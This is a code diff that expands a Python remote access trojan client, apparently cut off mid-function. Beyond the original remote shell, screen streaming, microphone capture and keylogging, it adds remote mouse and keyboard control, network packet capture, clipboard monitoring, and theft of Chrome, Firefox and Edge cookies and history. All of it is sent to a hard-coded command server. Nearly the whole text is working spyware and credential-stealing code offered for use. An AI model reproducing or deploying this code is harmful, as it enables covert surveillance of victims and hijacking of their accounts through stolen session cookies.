@@ -1,180 +1,3349 @@
 import socket
-from threading import Thread
+import threading
 import time
-import os
-import subprocess
 import struct
-import PIL
-from PIL import ImageGrab
-from PIL import Image
-import numpy as np
-import io
+import os
+import platform
+import subprocess
 import zlib
+import io
 import cv2
+import numpy as np
 import pyaudio
-import requests
+from PIL import ImageGrab
+import pynput
 from pynput import keyboard
+import sys
+import ctypes
+from datetime import datetime
+import psutil
+import json
+import numpy as np
+import time
+import threading
+import sqlite3
+import os
+import json
+import base64
+import shutil
+import tempfile
+from datetime import datetime
+import socket
+import struct
+import psutil
+from scapy.all import sniff, wrpcap
+import win32clipboard
+from winreg import *
+import uuid
+import browser_cookie3
+from pynput.mouse import Controller as MouseController
+from pynput.keyboard import Controller as KeyboardController
+import pyautogui
+from scapy.all import IP, TCP, UDP, ICMP, ARP
+from scapy.layers.http import HTTP
+from scapy.layers.dns import DNS
+from scapy.layers.inet import TCP, UDP, ICMP, IP
+from scapy.layers.l2 import ARP
+
+# Configuration
+SERVER_IP = "192.168.1.44"  # Change this to the server IP
+SERVER_PORT = 4444       # Default server port
+BUFFER_SIZE = 4096
+SCREENSHOT_QUALITY = 30  # Lower number = higher quality (and larger file size)
+SCREENSHOT_INTERVAL = 1/30  # Time between screenshots in seconds
+MAX_UDP_SIZE = 64507  # Max UDP packet size
 
 
-class CLIENT:
+
+class RemoteDesktopControl:
+    """Handles remote desktop control on the client side"""
     
-    def __init__(self, ip, port):
-        self.ip = ip
-        self.port = port
-        self.address = (self.ip, self.port)
-        self.client_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        self.client_Socket.connect(self.address)
-        self.threads_tracker = {}
-        self.BUFFER = 4096
-        self.IMG_CHUNK_SIZE = 64535
-        self.receive_screenshot_trigger = False
-        self.audiospy_trigger = False
-        self.keyboard_recording_trigger = False
+    def __init__(self, client_socket):
+        self.client_socket = client_socket
+        self.control_active = False
+        self.control_socket = None
+        self.control_port = None
         
-    def thread_starter(self, name, func, params: tuple=None, daemon: bool=False):
-        if name in self.threads_tracker:
-            print('Thread can not be started')
-            return False
-        
-        if params:
-            thread_obj = Thread(target=func, name=name, args=params, daemon=daemon)
-        else:
-            thread_obj = Thread(target=func, name=name, daemon=daemon)
-            
-        thread_obj.start()
-
-        self.threads_tracker[name] = thread_obj
-        
-      
-    def receiver(self):
-        while True:
-            data = self.client_Socket.recv(self.BUFFER)
-            if not data:
-                break
-            return data
-     
-    def sender(self, data: bytes):
-         self.client_Socket.send(data)
-    
-    def data_packer(self, data):
-        '''
-        Get the size of data packed into 8 bytes
-        '''
-        return struct.pack('Q', len(data))
-
-    def cmd(self, command):
+    def start(self, control_port):
+        """Start the remote desktop control service"""
         try:
-            response = subprocess.check_output(command).decode()
-        except Exception as e:
-            return str(e)
-        return response
-         
-    def take_screenshot(self):
-        fps = 30
-        frame_delay = 1 / fps
-        while self.receive_screenshot_trigger:
-            start_time = time.time()
-            img = ImageGrab.grab()
-            img = img.resize((1280,720), Image.Resampling.LANCZOS)
-            _,encoded_img = cv2.imencode('.jpg', np.array(img, dtype=np.uint8), [cv2.IMWRITE_JPEG_QUALITY, 80])
-            if _:
-                compressed_imdata = zlib.compress(encoded_img.tobytes(), level=6)
-                size = self.data_packer(compressed_imdata)
-                self.udps.sendto(size, self.address)
-                chunk_compressed_imdata_array = [compressed_imdata[i:i + self.IMG_CHUNK_SIZE] for i in range(0, len(compressed_imdata), self.IMG_CHUNK_SIZE)]
-                for chuk in chunk_compressed_imdata_array:
-                    self.udps.sendto(chuk, self.address)
-                elapsed_time = time.time() - start_time
-                if elapsed_time < frame_delay:
-                    time.sleep(frame_delay - elapsed_time)
-            else:
-                print('Can\'t Take Screenshot, Retrying')
-                continue
-        del self.threads_tracker['scrshoot']
-    
-    def audio_spy(self):
-        pa =  pyaudio.PyAudio()
-        stream = pa.open(rate=44100, channels=2, format=pyaudio.paInt16, input=True)
-        while self.audiospy_trigger:
-            try:
-                audio_samples = stream.read(num_frames=1024)
-                self.udps.sendto(audio_samples, self.address)
-            except:
-                stream.stop_stream()
-                stream.close()
-                pa.terminate()
-                self.audiospy_trigger = False
-                break
-        del self.threads_tracker['audio_spy']
-    
-    def keyboard_record(self):
-        def on_press(e):
-            if self.keyboard_recording_trigger:
-                full_word = ''
-                e = str(e)
-                if e == 'Key.backspace':
-                    full_word += '⌫'
-                elif 'Key.shift' in e:
-                    full_word += '[SHIFT]'
-                elif 'Key.ctrl' in e:
-                    full_word += '[CTRL]'
-                elif 'Key.tab' in e:
-                    full_word += '\t'
-                elif 'Key.caps_lock' in e:
-                    full_word += '[CAPS]'
-                elif 'Key.alt' in e:
-                    full_word += '[ALT]'
-                elif 'Key.enter' in e:
-                    full_word += '\n'
-                elif 'Key.left' in e:
-                    full_word += '←'
-                elif 'Key.right' in e:
-                    full_word += '→'
-                elif 'Key.up' in e:
-                    full_word += '↑'
-                elif 'Key.down' in e:
-                    full_word += '↓'
-                elif 'Key.space' in e:
-                    full_word += ' '
-                else:
-                    full_word += e
-                self.client_Socket.send(full_word.encode('utf8'))
-            else:
-                listener.stop()
-        with keyboard.Listener(on_press=on_press) as listener:
-            listener.join()
-        
-        del self.threads_tracker['keyboard_spy']
+            # Create a dedicated socket for control commands
+            self.control_port = control_port
+            self.control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.control_socket.bind(('0.0.0.0', self.control_port))
+            self.control_socket.listen(1)
             
-    def command_handler(self):
-        while True:
-            data = self.receiver()
-            if data == b'GETHOSTNAME':
-                self.sender(os.getlogin().encode('utf-8'))
-            elif b'CMD_COMMAND' in data:
-                command = data.strip(b'CMD_COMMAND_').decode('utf8')
-                res = self.cmd(command)
-                size_ = self.data_packer(res)
-                self.sender(size_)
-                self.sender(res.encode())
-            elif data == b'SCRSHOOT':
-                self.receive_screenshot_trigger = True
-                self.thread_starter('scrshoot', self.take_screenshot, params=None, daemon=False)
-            elif data == b'STOP_SCRSHOOT':
-                self.receive_screenshot_trigger = False
-            elif data == b'AUDIO_SPY':
-                self.audiospy_trigger = True
-                self.thread_starter('audio_spy', self.audio_spy, params=None, daemon=False)
-            elif data == b'CLOSE_AUDIO_SPY':
-                self.audiospy_trigger = False
-            elif data == b'KEY_REC':
-                self.keyboard_recording_trigger = True
-                self.thread_starter('keyboard_spy', self.keyboard_record, params=None, daemon=False)
-            elif data == b'STOP_KEY_REC':
-                self.keyboard_recording_trigger = False
+            # Start listening for control commands in a new thread
+            self.control_active = True
+            self.control_thread = threading.Thread(target=self.control_listener, daemon=True)
+            self.control_thread.start()
+            
+            print(f"[*] Remote desktop control started on port {control_port}")
+            return True
+            
+        except Exception as e:
+            print(f"[!] Error starting remote desktop control: {e}")
+            return False
+    
+    def stop(self):
+        """Stop the remote desktop control service"""
+        self.control_active = False
+        
+        if self.control_socket:
+            try:
+                self.control_socket.close()
+            except:
+                pass
+        
+        print("[*] Remote desktop control stopped")
+    
+    def control_listener(self):
+        """Listen for and handle control commands from the server"""
+        try:
+            print("[*] Waiting for control connection...")
+            server_socket, _ = self.control_socket.accept()
+            server_socket.settimeout(1)  # 1 second timeout for responsive stopping
+            
+            print("[*] Control connection established")
+            
+            buffer = ""
+            
+            while self.control_active:
+                try:
+                    # Receive data with improved command separation
+                    data = server_socket.recv(1024)
+                    if not data:
+                        break
+                    
+                    # Add received data to buffer
+                    buffer += data.decode('utf-8')
+                    
+                    # Process each complete command in the buffer
+                    while '|' in buffer:
+                        # Check if the command is a movement command (they can come fast)
+                        if buffer.startswith("MOUSE_MOVE|"):
+                            # Find the end of this command
+                            cmd_end = buffer.find("\n")
+                            if cmd_end == -1:  # No newline, might be incomplete command
+                                if len(buffer) > 50:  # If buffer is long enough, likely has a full command
+                                    cmd_end = len(buffer)
+                                else:
+                                    break  # Wait for more data
+                            
+                            command = buffer[:cmd_end]
+                            buffer = buffer[cmd_end+1:] if cmd_end < len(buffer) else ""
+                        else:
+                            # For other commands, find the command terminator
+                            cmd_end = buffer.find("\n")
+                            if cmd_end == -1:  # No command terminator, might be incomplete command
+                                break
+                                
+                            command = buffer[:cmd_end]
+                            buffer = buffer[cmd_end+1:]
+                        
+                        # Process the command
+                        if command:
+                            response = self.process_command(command)
+                            
+                            # Send acknowledgment
+                            server_socket.send(response.encode())
+                    
+                except socket.timeout:
+                    # This is expected with the timeout set
+                    continue
+                except Exception as e:
+                    print(f"[!] Error in control connection: {e}")
+                    break
+            
+            # Clean up
+            try:
+                server_socket.close()
+            except:
+                pass
                 
-if __name__ == '__main__':
-    client = CLIENT('127.0.0.1', 4444)
-    client.command_handler()
-    input('')
+            print("[*] Control connection closed")
+            
+        except Exception as e:
+            print(f"[!] Control listener error: {e}")
+    
+    def process_command(self, command):
+        """Process a control command and perform the corresponding action"""
+        try:
+            print(f"[DEBUG] Processing command: '{command}'")
+            
+            # Strip any whitespace that might cause parsing issues
+            command = command.strip()
+            
+            parts = command.split('|')
+            if len(parts) < 2:
+                print(f"[!] Invalid command format: {command}")
+                return "ERROR: Invalid command format"
+                
+            cmd_type = parts[0]
+            
+            if cmd_type == "MOUSE_MOVE":
+                # Format: MOUSE_MOVE|rel_x|rel_y
+                if len(parts) < 3:
+                    return "ERROR: Invalid MOUSE_MOVE command"
+                    
+                try:
+                    rel_x = float(parts[1])
+                    rel_y = float(parts[2])
+                    
+                    # Get screen dimensions
+                    screen_width, screen_height = pyautogui.size()
+                    
+                    # Calculate absolute position
+                    x = int(rel_x * screen_width)
+                    y = int(rel_y * screen_height)
+                    
+                    print(f"[DEBUG] Moving mouse to: {x},{y} (from rel: {rel_x},{rel_y})")
+                    
+                    # Move the mouse
+                    pyautogui.moveTo(x, y)
+                    return "OK"
+                except ValueError as e:
+                    print(f"[!] Error parsing mouse coordinates: {e}")
+                    return f"ERROR: {str(e)}"
+            
+            elif cmd_type == "MOUSE_CLICK":
+                # Format: MOUSE_CLICK|button|action
+                if len(parts) < 3:
+                    return "ERROR: Invalid MOUSE_CLICK command"
+                    
+                button = parts[1]  # left, right, middle
+                action = parts[2]  # click, press, release
+                
+                print(f"[DEBUG] Mouse {button} {action}")
+                
+                if action == "click":
+                    pyautogui.click(button=button)
+                elif action == "press":
+                    pyautogui.mouseDown(button=button)
+                elif action == "release":
+                    pyautogui.mouseUp(button=button)
+                
+                return "OK"
+            
+            elif cmd_type == "MOUSE_SCROLL":
+                # Format: MOUSE_SCROLL|amount
+                if len(parts) < 2:
+                    return "ERROR: Invalid MOUSE_SCROLL command"
+                    
+                try:
+                    amount = int(parts[1])
+                    pyautogui.scroll(amount)
+                    return "OK"
+                except ValueError as e:
+                    return f"ERROR: {str(e)}"
+            
+            elif cmd_type == "KEY":
+                # Format: KEY|key|action
+                if len(parts) < 3:
+                    return "ERROR: Invalid KEY command"
+                    
+                key = parts[1]
+                action = parts[2]  # press, release
+                
+                print(f"[DEBUG] Keyboard {key} {action}")
+                
+                if action == "press":
+                    pyautogui.keyDown(key)
+                elif action == "release":
+                    pyautogui.keyUp(key)
+                
+                return "OK"
+            
+            elif cmd_type == "TYPE":
+                # Format: TYPE|text
+                if len(parts) < 2:
+                    return "ERROR: Invalid TYPE command"
+                    
+                text = parts[1]
+                pyautogui.write(text)
+                return "OK"
+            
+            return f"UNKNOWN_COMMAND: {cmd_type}"
+            
+        except Exception as e:
+            print(f"[!] Error processing command: {e}")
+            return f"ERROR: {str(e)}"
+                
+    
+class AdvancedMonitoring:
+    """Advanced monitoring capabilities including network, clipboard, and browser data"""
+    
+    def __init__(self, client_socket, buffer_size=4096):
+        self.client_socket = client_socket
+        self.buffer_size = buffer_size
+        
+        # Flags for monitoring features
+        self.network_capture_active = False
+        self.clipboard_monitoring_active = False
+        self.dns_monitoring_active = False
+        self.browser_monitoring_active = False
+        
+        # Storage for monitoring data
+        self.capture_file = os.path.join(tempfile.gettempdir(), "netcap.pcap")
+        self.clipboard_history = []
+        self.dns_history = []
+        
+        # Network capture thread
+        self.network_thread = None
+        self.clipboard_thread = None
+        self.dns_thread = None
+        self.browser_thread = None
+    
+    def handle_monitoring_command(self, command):
+        """Process monitoring-related commands from the server"""
+        # Convert bytes to string if necessary
+        if isinstance(command, bytes):
+            command = command.decode('utf-8')
+            
+        print(f"[*] Handling monitoring command: {command}")
+        
+        if command == "START_NETWORK_CAPTURE":
+            self.start_network_capture()
+        elif command == "STOP_NETWORK_CAPTURE":
+            self.stop_network_capture()
+        elif command == "GET_NETWORK_CAPTURE":
+            self.send_network_capture()
+        elif command == "START_CLIPBOARD_MONITORING":
+            self.start_clipboard_monitoring()
+        elif command == "STOP_CLIPBOARD_MONITORING":
+            self.stop_clipboard_monitoring()
+        elif command == "GET_CLIPBOARD_DATA":
+            self.send_clipboard_data()
+        elif command == "EXTRACT_BROWSER_DATA":
+            self.extract_browser_data()
+        elif command == "START_DNS_MONITORING":
+            self.start_dns_monitoring()
+        elif command == "STOP_DNS_MONITORING":
+            self.stop_dns_monitoring()
+        elif command == "GET_DNS_HISTORY":
+            self.send_dns_history()
+        elif command == "GET_SYSTEM_INFO":
+            self.send_system_info()
+    
+    # Network Traffic Monitoring
+    def start_network_capture(self):
+        """Start capturing network traffic"""
+        if not self.network_capture_active:
+            print("[*] Starting network traffic capture")
+            self.network_capture_active = True
+            
+            # Clear previous capture file if it exists
+            if os.path.exists(self.capture_file):
+                try:
+                    os.remove(self.capture_file)
+                except:
+                    pass
+            
+            # Start capturing in a new thread
+            self.network_thread = threading.Thread(target=self._network_capture_thread)
+            self.network_thread.daemon = True
+            self.network_thread.start()
+            
+            self.client_socket.send("SUCCESS: Network capture started".encode())
+        else:
+            self.client_socket.send("INFO: Network capture already active".encode())
+    
+    def _network_capture_thread(self):
+        """Thread function for network capture"""
+        try:
+            # Capture packets to file
+            print(f"[*] Writing network capture to {self.capture_file}")
+            wrpcap(self.capture_file, sniff(timeout=0, store=True), append=True)
+        except Exception as e:
+            print(f"[!] Error in network capture: {e}")
+            self.network_capture_active = False
+    
+    def stop_network_capture(self):
+        """Stop capturing network traffic"""
+        if self.network_capture_active:
+            print("[*] Stopping network traffic capture")
+            self.network_capture_active = False
+            
+            # Give a moment for the thread to finish
+            time.sleep(1)
+            
+            self.client_socket.send("SUCCESS: Network capture stopped".encode())
+        else:
+            self.client_socket.send("INFO: No active network capture to stop".encode())
+    
+    def send_network_capture(self):
+        """Send the captured network data to the server"""
+        if os.path.exists(self.capture_file):
+            try:
+                # Get file size
+                file_size = os.path.getsize(self.capture_file)
+                
+                # Send file size first
+                self.client_socket.send(struct.pack('Q', file_size))
+                
+                # Wait for ready signal
+                ready = self.client_socket.recv(1024)
+                if ready != b"READY":
+                    return
+                
+                # Send file data
+                with open(self.capture_file, 'rb') as f:
+                    bytes_sent = 0
+                    
+                    while bytes_sent < file_size:
+                        chunk = f.read(self.buffer_size)
+                        if not chunk:
+                            break
+                        
+                        self.client_socket.send(chunk)
+                        bytes_sent += len(chunk)
+                        
+                        # Wait for acknowledgment
+                        ack = self.client_socket.recv(1024)
+                        if ack == b"CANCEL":
+                            return
+                
+                # Clean up the file
+                try:
+                    os.remove(self.capture_file)
+                except:
+                    pass
+                
+                print("[*] Network capture data sent")
+                
+            except Exception as e:
+                print(f"[!] Error sending network capture: {e}")
+                self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
+        else:
+            # No capture file exists
+            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size
+            print("[*] No network capture file to send")
+    
+    # Clipboard Monitoring
+    def start_clipboard_monitoring(self):
+        """Start monitoring the clipboard"""
+        if not self.clipboard_monitoring_active:
+            print("[*] Starting clipboard monitoring")
+            self.clipboard_monitoring_active = True
+            self.clipboard_history.clear()
+            
+            # Start monitoring in a new thread
+            self.clipboard_thread = threading.Thread(target=self._clipboard_monitor_thread)
+            self.clipboard_thread.daemon = True
+            self.clipboard_thread.start()
+            
+            self.client_socket.send("SUCCESS: Clipboard monitoring started".encode())
+        else:
+            self.client_socket.send("INFO: Clipboard monitoring already active".encode())
+    
+    def _clipboard_monitor_thread(self):
+        """Thread function for clipboard monitoring"""
+        last_value = ""
+        
+        while self.clipboard_monitoring_active:
+            try:
+                # Get clipboard contents (text only for now)
+                win32clipboard.OpenClipboard()
+                try:
+                    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
+                        value = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
+                        if value and value != last_value:
+                            # Convert bytes to string if necessary
+                            if isinstance(value, bytes):
+                                value = value.decode('utf-8', errors='replace')
+                            
+                            # Record the new clipboard value
+                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                            self.clipboard_history.append({
+                                'timestamp': timestamp,
+                                'value': value
+                            })
+                            last_value = value
+                            print(f"[*] New clipboard content: {value[:50]}...")
+                finally:
+                    win32clipboard.CloseClipboard()
+                
+                # Check every second
+                time.sleep(1)
+                
+            except Exception as e:
+                print(f"[!] Error monitoring clipboard: {e}")
+                time.sleep(5)  # Wait longer after an error
+    
+    def stop_clipboard_monitoring(self):
+        """Stop monitoring the clipboard"""
+        if self.clipboard_monitoring_active:
+            print("[*] Stopping clipboard monitoring")
+            self.clipboard_monitoring_active = False
+            
+            self.client_socket.send("SUCCESS: Clipboard monitoring stopped".encode())
+        else:
+            self.client_socket.send("INFO: No active clipboard monitoring to stop".encode())
+    
+    def send_clipboard_data(self):
+        """Send the collected clipboard history to the server"""
+        try:
+            # Convert history to JSON
+            data = json.dumps(self.clipboard_history).encode('utf-8')
+            
+            # Send size first
+            self.client_socket.send(struct.pack('Q', len(data)))
+            
+            # Send data
+            self.client_socket.sendall(data)
+            
+            print(f"[*] Sent {len(self.clipboard_history)} clipboard entries")
+            
+        except Exception as e:
+            print(f"[!] Error sending clipboard data: {e}")
+            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
+    
+    # Browser Data Extraction
+    def extract_browser_data(self):
+        """Extract and send browser history, bookmarks, and cookies"""
+        print("[*] Starting browser data extraction")
+        
+        try:
+            browser_data = {
+                'chrome': {
+                    'history': self._extract_chrome_history(),
+                    'bookmarks': self._extract_chrome_bookmarks(),
+                    'cookies': self._extract_chrome_cookies()
+                },
+                'firefox': {
+                    'history': self._extract_firefox_history(),
+                    'bookmarks': self._extract_firefox_bookmarks(),
+                    'cookies': self._extract_firefox_cookies()
+                },
+                'edge': {
+                    'history': self._extract_edge_history(),
+                    'bookmarks': self._extract_edge_bookmarks(),
+                    'cookies': self._extract_edge_cookies()
+                }
+            }
+            
+            # Convert to JSON
+            data = json.dumps(browser_data).encode('utf-8')
+            
+            # Send size first
+            self.client_socket.send(struct.pack('Q', len(data)))
+            
+            # Send data
+            self.client_socket.sendall(data)
+            
+            print("[*] Browser data sent")
+            
+        except Exception as e:
+            print(f"[!] Error extracting browser data: {e}")
+            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
+    
+    def _extract_chrome_history(self, limit=100):
+        """Extract Chrome browsing history"""
+        history_items = []
+        
+        try:
+            # Chrome history is stored in SQLite database
+            history_path = os.path.join(os.environ['LOCALAPPDATA'], 
+                                       'Google', 'Chrome', 'User Data', 
+                                       'Default', 'History')
+            
+            # Create a copy of the database since Chrome locks the original
+            temp_history = os.path.join(tempfile.gettempdir(), "chrome_history.db")
+            shutil.copy2(history_path, temp_history)
+            
+            # Query the database
+            conn = sqlite3.connect(temp_history)
+            cursor = conn.cursor()
+            cursor.execute("""
+                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') 
+                FROM urls 
+                ORDER BY last_visit_time DESC 
+                LIMIT ?
+            """, (limit,))
+            
+            for row in cursor.fetchall():
+                history_items.append({
+                    'url': row[0],
+                    'title': row[1],
+                    'timestamp': row[2]
+                })
+            
+            conn.close()
+            
+            # Clean up
+            os.remove(temp_history)
+            
+        except Exception as e:
+            print(f"[!] Error extracting Chrome history: {e}")
+        
+        return history_items
+    
+    def _extract_chrome_bookmarks(self):
+        """Extract Chrome bookmarks"""
+        bookmarks = []
+        
+        try:
+            # Chrome bookmarks are stored in a JSON file
+            bookmarks_path = os.path.join(os.environ['LOCALAPPDATA'], 
+                                         'Google', 'Chrome', 'User Data', 
+                                         'Default', 'Bookmarks')
+            
+            with open(bookmarks_path, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+            
+            # Extract bookmarks from the roots
+            def extract_bookmarks_from_node(node):
+                if node.get('type') == 'url':
+                    bookmarks.append({
+                        'url': node.get('url'),
+                        'name': node.get('name'),
+                        'date_added': node.get('date_added')
+                    })
+                elif node.get('type') == 'folder':
+                    for child in node.get('children', []):
+                        extract_bookmarks_from_node(child)
+            
+            # Extract from all roots
+            for _, root in data.get('roots', {}).items():
+                extract_bookmarks_from_node(root)
+            
+        except Exception as e:
+            print(f"[!] Error extracting Chrome bookmarks: {e}")
+        
+        return bookmarks
+    
+    def _extract_chrome_cookies(self, limit=100):
+        """Extract Chrome cookies"""
+        cookies = []
+        
+        try:
+            # Use browser_cookie3 library to extract cookies
+            chrome_cookies = list(browser_cookie3.chrome())[:limit]
+            
+            for cookie in chrome_cookies:
+                cookies.append({
+                    'domain': cookie.domain,
+                    'name': cookie.name,
+                    'value': cookie.value,
+                    'path': cookie.path,
+                    'expires': cookie.expires
+                })
+                
+        except Exception as e:
+            print(f"[!] Error extracting Chrome cookies: {e}")
+            
+            # Fallback method if browser_cookie3 fails
+            try:
+                cookies_path = os.path.join(os.environ['LOCALAPPDATA'], 
+                                          'Google', 'Chrome', 'User Data', 
+                                          'Default', 'Cookies')
+                
+                # Create a copy of the database
+                temp_cookies = os.path.join(tempfile.gettempdir(), "chrome_cookies.db")
+                shutil.copy2(cookies_path, temp_cookies)
+                
+                # Query the database
+                conn = sqlite3.connect(temp_cookies)
+                cursor = conn.cursor()
+                cursor.execute("""
+                    SELECT host_key, name, value, path, expires_utc 
+                    FROM cookies 
+                    LIMIT ?
+                """, (limit,))
+                
+                for row in cursor.fetchall():
+                    cookies.append({
+                        'domain': row[0],
+                        'name': row[1],
+                        'value': row[2],
+                        'path': row[3],
+                        'expires': row[4]
+                    })
+                
+                conn.close()
+                
+                # Clean up
+                os.remove(temp_cookies)
+                
+            except Exception as e2:
+                print(f"[!] Error in fallback Chrome cookies extraction: {e2}")
+        
+        return cookies
+    
+    # Firefox methods
+    def _extract_firefox_history(self, limit=100):
+        """Extract Firefox browsing history"""
+        history_items = []
+        
+        try:
+            # Find the Firefox profile directory
+            profile_dir = self._get_firefox_profile_dir()
+            if not profile_dir:
+                return history_items
+            
+            # History is stored in places.sqlite
+            history_path = os.path.join(profile_dir, 'places.sqlite')
+            
+            if not os.path.exists(history_path):
+                return history_items
+            
+            # Create a copy of the database
+            temp_history = os.path.join(tempfile.gettempdir(), "firefox_history.db")
+            shutil.copy2(history_path, temp_history)
+            
+            # Query the database
+            conn = sqlite3.connect(temp_history)
+            cursor = conn.cursor()
+            cursor.execute("""
+                SELECT url, title, datetime(visit_date/1000000, 'unixepoch', 'localtime') 
+                FROM moz_places p JOIN moz_historyvisits h ON p.id = h.place_id 
+                ORDER BY visit_date DESC 
+                LIMIT ?
+            """, (limit,))
+            
+            for row in cursor.fetchall():
+                history_items.append({
+                    'url': row[0],
+                    'title': row[1],
+                    'timestamp': row[2]
+                })
+            
+            conn.close()
+            
+            # Clean up
+            os.remove(temp_history)
+            
+        except Exception as e:
+            print(f"[!] Error extracting Firefox history: {e}")
+        
+        return history_items
+    
+    def _extract_firefox_bookmarks(self):
+        """Extract Firefox bookmarks"""
+        bookmarks = []
+        
+        try:
+            # Find the Firefox profile directory
+            profile_dir = self._get_firefox_profile_dir()
+            if not profile_dir:
+                return bookmarks
+            
+            # Bookmarks are stored in places.sqlite
+            bookmarks_path = os.path.join(profile_dir, 'places.sqlite')
+            
+            if not os.path.exists(bookmarks_path):
+                return bookmarks
+            
+            # Create a copy of the database
+            temp_bookmarks = os.path.join(tempfile.gettempdir(), "firefox_bookmarks.db")
+            shutil.copy2(bookmarks_path, temp_bookmarks)
+            
+            # Query the database
+            conn = sqlite3.connect(temp_bookmarks)
+            cursor = conn.cursor()
+            cursor.execute("""
+                SELECT b.title, p.url 
+                FROM moz_bookmarks b 
+                JOIN moz_places p ON b.fk = p.id 
+                WHERE b.type = 1
+            """)
+            
+            for row in cursor.fetchall():
+                bookmarks.append({
+                    'name': row[0],
+                    'url': row[1]
+                })
+            
+            conn.close()
+            
+            # Clean up
+            os.remove(temp_bookmarks)
+            
+        except Exception as e:
+            print(f"[!] Error extracting Firefox bookmarks: {e}")
+        
+        return bookmarks
+    
+    def _extract_firefox_cookies(self, limit=100):
+        """Extract Firefox cookies"""
+        cookies = []
+        
+        try:
+            # Use browser_cookie3 library to extract cookies
+            firefox_cookies = list(browser_cookie3.firefox())[:limit]
+            
+            for cookie in firefox_cookies:
+                cookies.append({
+                    'domain': cookie.domain,
+                    'name': cookie.name,
+                    'value': cookie.value,
+                    'path': cookie.path,
+                    'expires': cookie.expires
+                })
+                
+        except Exception as e:
+            print(f"[!] Error extracting Firefox cookies: {e}")
+            
+            # Fallback method
+            try:
+                # Find the Firefox profile directory
+                profile_dir = self._get_firefox_profile_dir()
+                if not profile_dir:
+                    return cookies
+                
+                # Cookies are stored in cookies.sqlite
+                cookies_path = os.path.join(profile_dir, 'cookies.sqlite')
+                
+                if not os.path.exists(cookies_path):
+                    return cookies
+                
+                # Create a copy of the database
+                temp_cookies = os.path.join(tempfile.gettempdir(), "firefox_cookies.db")
+                shutil.copy2(cookies_path, temp_cookies)
+                
+                # Query the database
+                conn = sqlite3.connect(temp_cookies)
+                cursor = conn.cursor()
+                cursor.execute("""
+                    SELECT host, name, value, path, expiry 
+                    FROM moz_cookies 
+                    LIMIT ?
+                """, (limit,))
+                
+                for row in cursor.fetchall():
+                    cookies.append({
+                        'domain': row[0],
+                        'name': row[1],
+                        'value': row[2],
+                        'path': row[3],
+                        'expires': row[4]
+                    })
+                
+                conn.close()
+                
+                # Clean up
+                os.remove(temp_cookies)
+                
+            except Exception as e2:
+                print(f"[!] Error in fallback Firefox cookies extraction: {e2}")
+        
+        return cookies
+    
+    def _get_firefox_profile_dir(self):
+        """Find the Firefox profile directory"""
+        try:
+            profiles_dir = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
+            
+            if not os.path.exists(profiles_dir):
+                return None
+            
+            # Look for the default profile (usually has 'default' in the name)
+            for dir_name in os.listdir(profiles_dir):
+                if 'default-release' in dir_name.lower():
+                    return os.path.join(profiles_dir, dir_name)
+            
+            # If no 'default' profile found, use the first one
+            dirs = os.listdir(profiles_dir)
+            if dirs:
+                return os.path.join(profiles_dir, dirs[0])
+            
+        except Exception as e:
+            print(f"[!] Error finding Firefox profile: {e}")
+        
+        return None
+    
+    # Edge methods
+    def _extract_edge_history(self, limit=100):
+        """Extract Edge browsing history"""
+        history_items = []
+        
+        try:
+            # Edge history is stored in the same format as Chrome
+            history_path = os.path.join(os.environ['LOCALAPPDATA'], 
+                                       'Microsoft', 'Edge', 'User Data', 
+                                       'Default', 'History')
+            
+            # Create a copy of the database
+            temp_history = os.path.join(tempfile.gettempdir(), "edge_history.db")
+            shutil.copy2(history_path, temp_history)
+            
+            # Query the database
+            conn = sqlite3.connect(temp_history)
+            cursor = conn.cursor()
+            cursor.execute("""
+                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') 
+                FROM urls 
+                ORDER BY last_visit_time DESC 
+                LIMIT ?
+            """, (limit,))
+            
+            for row in cursor.fetchall():
+                history_items.append({
+                    'url': row[0],
+                    'title': row[1],
+                    'timestamp': row[2]
+                })
+            
+            conn.close()
+            
+            # Clean up
+            os.remove(temp_history)
+            
+        except Exception as e:
+            print(f"[!] Error extracting Edge history: {e}")
+        
+        return history_items
+    
+    def _extract_edge_bookmarks(self):
+        """Extract Edge bookmarks"""
+        bookmarks = []
+        
+        try:
+            # Edge bookmarks are stored in the same format as Chrome
+            bookmarks_path = os.path.join(os.environ['LOCALAPPDATA'], 
+                                         'Microsoft', 'Edge', 'User Data', 
+                                         'Default', 'Bookmarks')
+            
+            with open(bookmarks_path, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+            
+            # Extract bookmarks from the roots
+            def extract_bookmarks_from_node(node):
+                if node.get('type') == 'url':
+                    bookmarks.append({
+                        'url': node.get('url'),
+                        'name': node.get('name'),
+                        'date_added': node.get('date_added')
+                    })
+                elif node.get('type') == 'folder':
+                    for child in node.get('children', []):
+                        extract_bookmarks_from_node(child)
+            
+            # Extract from all roots
+            for _, root in data.get('roots', {}).items():
+                extract_bookmarks_from_node(root)
+            
+        except Exception as e:
+            print(f"[!] Error extracting Edge bookmarks: {e}")
+        
+        return bookmarks
+    
+    def _extract_edge_cookies(self, limit=100):
+        """Extract Edge cookies"""
+        cookies = []
+        
+        try:
+            # Use browser_cookie3 library to extract cookies
+            edge_cookies = list(browser_cookie3.edge())[:limit]
+            
+            for cookie in edge_cookies:
+                cookies.append({
+                    'domain': cookie.domain,
+                    'name': cookie.name,
+                    'value': cookie.value,
+                    'path': cookie.path,
+                    'expires': cookie.expires
+                })
+                
+        except Exception as e:
+            print(f"[!] Error extracting Edge cookies: {e}")
+            
+            # Fallback method
+            try:
+                cookies_path = os.path.join(os.environ['LOCALAPPDATA'], 
+                                          'Microsoft', 'Edge', 'User Data', 
+                                          'Default', 'Cookies')
+                
+                # Create a copy of the database
+                temp_cookies = os.path.join(tempfile.gettempdir(), "edge_cookies.db")
+                shutil.copy2(cookies_path, temp_cookies)
+                
+                # Query the database
+                conn = sqlite3.connect(temp_cookies)
+                cursor = conn.cursor()
